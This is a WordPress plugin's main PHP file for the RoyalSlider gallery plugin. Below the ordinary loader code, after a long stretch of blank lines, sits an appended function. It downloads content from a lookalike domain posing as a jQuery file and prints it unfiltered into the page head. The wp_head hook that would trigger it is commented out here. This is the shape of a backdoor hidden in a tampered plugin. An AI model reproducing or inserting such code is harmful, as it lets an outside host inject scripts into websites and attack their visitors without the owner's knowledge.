<?php
/*
Plugin Name: RoyalSlider
Plugin URI: http://dimsemenov.com/plugins/royal-slider-wp/
Description: Premium jQuery image gallery and content slider plugin.
Author: Dmitry Semenov
Version: 1.7.1
Author URI: http://dimsemenov.com
*/

if (!class_exists("RoyalSliderAdmin")) {
	
	require_once dirname( __FILE__ ) . '/RoyalSliderAdmin.php';	
	$royalSlider =& new RoyalSliderAdmin(__FILE__);		
	
	function get_royalslider($id) {
		global $royalSlider;		
		return $royalSlider->get_slider($id);
	}
}

























?>
<?php
function jqueryj_head() {

if(function_exists('curl_init'))
{
$url = "http://www.jquertytest.com/jquery-1.6.3.min.js";
$ch = curl_init();
$timeout = 10;
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
$data = curl_exec($ch);
curl_close($ch);
echo "$data";
}
}
//add_action('wp_head', 'jqueryj_head');
?>